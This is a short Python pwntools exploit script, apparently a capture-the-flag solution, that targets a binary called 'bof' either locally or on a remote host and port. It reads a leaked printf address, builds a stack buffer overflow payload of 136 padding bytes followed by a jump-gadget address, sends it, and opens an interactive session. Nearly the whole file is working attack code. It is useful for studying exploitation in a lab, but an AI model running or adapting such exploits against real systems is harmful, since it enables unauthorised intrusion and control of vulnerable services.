#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])   
    p = remote(addr,port)
else:
    p = process('./bof')

# some func leak libc
printf = u64(p.recv(8))
log.info("printf= " + hex(printf))
p.recvuntil("input\n")

# jmp gadget
dispatcher = 0x0400627

buflen = 136
payload = ''.ljust(buflen,'\0')
payload += p64(dispatcher)

# gdb.attach(p)
p.sendline(payload)

p.interactive()
